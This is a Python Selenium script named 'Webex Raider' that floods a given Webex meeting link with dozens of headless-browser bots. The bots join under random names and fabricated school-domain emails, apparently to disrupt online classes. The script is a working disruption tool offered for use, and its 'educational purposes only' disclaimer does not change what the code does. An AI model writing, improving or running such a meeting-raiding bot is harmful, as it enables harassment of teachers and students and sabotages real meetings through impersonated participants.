from selenium import webdriver
import os
from time import sleep
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import random
import threading
import atexit
import re
import numberize
from termcolor import colored





logo = colored("""


     ░██╗░░░░░░░██╗███████╗██████╗░███████╗██╗░░██╗  ██████╗░░█████╗░██╗██████╗░███████╗██████╗░
     ░██║░░██╗░░██║██╔════╝██╔══██╗██╔════╝╚██╗██╔╝  ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
     ░╚██╗████╗██╔╝█████╗░░██████╦╝█████╗░░░╚███╔╝░  ██████╔╝███████║██║██║░░██║█████╗░░██████╔╝
     ░░████╔═████║░██╔══╝░░██╔══██╗██╔══╝░░░██╔██╗░  ██╔══██╗██╔══██║██║██║░░██║██╔══╝░░██╔══██╗
     ░░╚██╔╝░╚██╔╝░███████╗██████╦╝███████╗██╔╝╚██╗  ██║░░██║██║░░██║██║██████╔╝███████╗██║░░██║
     ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
""", "red")

bar = colored("""
    +-----------------------------------+
    |Made by SPYD3RM4N. Kalo Mathima ;) |
    +-----------+-----------------------+
    |Version 1.1|
    +-----------+
""", "red")

warning = colored(r"""


    _____  _                       _____                _   _ 
   |  __ \| |                     |  __ \              | | | |
   | |__) | | ___  __ _ ___  ___  | |__) |___  __ _  __| | | |
   |  ___/| |/ _ \/ _` / __|/ _ \ |  _  // _ \/ _` |/ _` | | |
   | |    | |  __/ (_| \__ \  __/ | | \ \  __/ (_| | (_| | |_|
   |_|    |_|\___|\__,_|___/\___| |_|  \_\___|\__,_|\__,_| (_)
                                                            
                                                            
                                                         
                                                         

  The moment you downloaded the program you are held responsible for anything you do with it.
  This tool was created for educational purposes only.

  Fair Use: Copyright Disclaimer under section 107 of the Copyright Act of 1976,
  allowance is made for "fair use" for purposes such as
  criticism, comment, news reporting, teaching, scholarship, education and research.
  Fair use is a use permitted by copyright statute that might otherwise be infringing.

  This means that in case this program is used for illegal or unethical purposes
  and geniunly any other purpose you are responsible.

  If you don't agree with these terms you are free to exit the program.
  You can exit the program by clicking X on the upper right of the window or pressing Control + C.


""", "yellow")
os.system("cls")
os.system("title Webex Raider v1.1")
print(warning)
input("  Press enter to continue...")
os.system("cls")

#Fake Load: Don't judge it looks cool
for a in range(1, 2):
		os.system("cls")
		for i in range(1, 3):
			print(colored("Loading" + "." * i, "red"))
			sleep(1)
			os.system("cls")

print(logo)
print(bar)

for i in range(0, 2):
	print("")

link = input("    Link:")
print("")

bots = input("    Bots(default=50):")
print("")

timeout = input("    Timeout(default=6, The lower the faster the bots join but with lower success rate):")

if bots == None or bots == "":
	bots = 50

if timeout == None or timeout == "":
	timeout = 6

limit = 5



lines = open("usernames.txt").readlines()
options = Options()
options.headless = True
options.add_experimental_option("excludeSwitches", ["enable-logging"])
drivers = []

def attack(link, timeout):
	global options
	global lines
	global drivers
	driver = webdriver.Chrome("./driver/chromedriver.exe", options=options)
	drivers.append(driver)
	driver.get(link)
	browser = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div[1]/div/div[2]/div[1]/div[2]/div[3]/a').click()
	sleep(timeout/2)
	actions = ActionChains(driver)
	name = random.choice(lines)
	actions.send_keys(name)
	actions.send_keys(Keys.TAB)
	email = (f'a{str(random.randrange(0, 999999))}@sch.gr')
	actions.send_keys(email)
	actions.perform()
	sleep(timeout/2)
	join = ActionChains(driver)
	join.send_keys(Keys.ENTER)
	join.perform()
	join2 = ActionChains(driver)
	join2.send_keys(Keys.ENTER)
	join2.perform()
	if driver.title == "Meeting is in progress...":
		print("")
		print(colored("    Bot " + re.sub('[^a-zA-Z0-9]+', '', name) + " has joined the meeting...", "red"))
	else:
		print("")
		print("    Error: Bot didn't join the meeting. If too many errors try raising the timeout.")
		driver.close()

def quit():
	global drivers
	os.system("taskkill /IM chrome.exe /F")
	for driver in drivers:
		driver.quit
	


atexit.register(quit)
	

print("")
print(colored("    Attack has started please wait...", "red"))
print(colored("    In case you want to exit press Control + C", "red"))

numbers = numberize.multiply(int(bots))
first = numbers[0] 
last = numbers[1]
extra = False
if 1 in numbers:
	extra = True


	
for i in range(int(first)):
	
	for i in range(last):
		t = threading.Thread(target=attack, args=(link, float(timeout)))
		t.start()
		sleep(0.6)
	sleep(float(timeout)-0.9)

if extra:
		t.start()

